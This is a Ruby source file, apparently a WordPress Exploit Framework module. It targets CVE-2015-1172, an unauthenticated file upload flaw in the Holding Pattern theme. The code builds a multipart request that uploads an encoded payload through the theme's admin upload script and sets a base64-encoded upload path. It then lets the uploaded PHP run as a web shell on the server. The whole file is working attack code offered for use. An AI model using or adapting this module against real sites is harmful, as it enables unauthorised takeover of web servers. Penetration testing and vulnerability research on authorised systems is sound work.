# frozen_string_literal: true

require 'socket'

class Wpxf::Exploit::HoldingPatternShellUpload < Wpxf::Exploit::SimplecartShellUpload
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Holding Pattern Theme Shell Upload',
      desc: 'This module exploits a file upload vulnerability in all versions '\
            'of the Holding Pattern theme found in the upload_file.php script '\
            'which contains no session or file validation. It allows '\
            'unauthenticated users to upload files of any type and '\
            'subsequently execute PHP scripts in the context of the '\
            'web server.',
      author: [
        'Alexander Borg', # Vulnerability disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['CVE', '2015-1172'],
        ['WPVDB', '7784']
      ],
      date: 'Feb 11 2015'
    )
  end

  def check
    check_theme_version_from_readme('holding_pattern')
  end

  def plugin_url
    normalize_uri(wordpress_url_themes, 'holding_pattern')
  end

  def uploads_url
    normalize_uri(plugin_url, 'uploads/')
  end

  def uploader_url
    normalize_uri(plugin_url, 'admin', 'upload-file.php')
  end

  def payload_body_builder(payload_name)
    target_ip = IPSocket.getaddress(target_host)
    field_name = Utility::Text.md5(target_ip)

    builder = Utility::BodyBuilder.new
    builder.add_file_from_string(field_name, payload.encoded, payload_name)
    builder.add_field('upload_path', 'Li4vdXBsb2Fkcw==')
    builder
  end
end
